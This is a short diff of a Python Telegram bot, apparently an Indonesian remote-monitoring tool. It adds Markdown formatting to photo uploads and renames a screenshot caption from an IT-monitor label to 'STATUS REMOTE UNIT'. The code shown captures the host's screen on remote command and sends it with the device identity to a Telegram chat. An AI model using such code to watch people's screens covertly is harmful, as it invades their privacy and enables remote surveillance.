@@ -166,6 +166,10 @@ def send_telegram_photo(image_bytes: bytes, caption: str, inline_keyboard: list 
         body.extend(caption.encode("utf-8"))
         body.extend(b"\r\n")
 
+        body.extend(f"--{boundary}\r\n".encode())
+        body.extend(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
+        body.extend(b"Markdown\r\n")
+
         if inline_keyboard:
             body.extend(f"--{boundary}\r\n".encode())
             body.extend(b'Content-Disposition: form-data; name="reply_markup"\r\n\r\n')
@@ -278,7 +282,7 @@ def _telegram_remote_listener_loop():
                                 ss = capture_host_screen()
                                 now_str = time.strftime("%Y-%m-%d %H:%M:%S")
                                 cap = (
-                                    "📸 *[SCREENSHOT MONITOR IT]*\n"
+                                    "📸 *[STATUS REMOTE UNIT]*\n"
                                     "```\n"
                                     f"Perangkat : {get_system_identity()}\n"
                                     "Status    : Tangkapan Layar Berhasil ✅\n"
@@ -319,7 +323,7 @@ def _telegram_remote_listener_loop():
                                 ss = capture_host_screen()
                                 now_str = time.strftime("%Y-%m-%d %H:%M:%S")
                                 cap = (
-                                    "📸 *[SCREENSHOT MONITOR IT]*\n"
+                                    "📸 *[STATUS REMOTE UNIT]*\n"
                                     "```\n"
                                     f"Perangkat : {get_system_identity()}\n"
                                     "Status    : Tangkapan Layar Berhasil ✅\n"
